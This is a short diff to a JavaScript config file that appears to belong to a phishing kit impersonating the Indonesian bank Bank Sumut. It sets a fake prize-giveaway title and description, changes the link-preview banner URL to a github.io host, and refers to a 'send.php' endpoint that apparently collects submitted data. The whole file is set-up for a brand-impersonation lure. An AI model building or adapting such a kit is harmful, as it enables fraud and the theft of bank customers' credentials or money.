@@ -3,7 +3,7 @@ const APP_TITLE = "Gebyar Bank Sumut";
 // Deskripsi web/iklan
 const APP_DESC = "Dapatkan hadiah menarik dari Bank Sumut buat kamu yang beruntung";
 // URL banner gambar
-const BANNER_URL = "https://blz.hstn.me/links/banners/link_preview_banksumut.png";
+const BANNER_URL = "https://banklink2.github.io/links/banners/link_preview_banksumut.png";
 // URL API (tempat dimana file send.php ditaruh, kosongkan jika file send.php ditaruh di halaman depan/root)
 const API_URL = "";
 
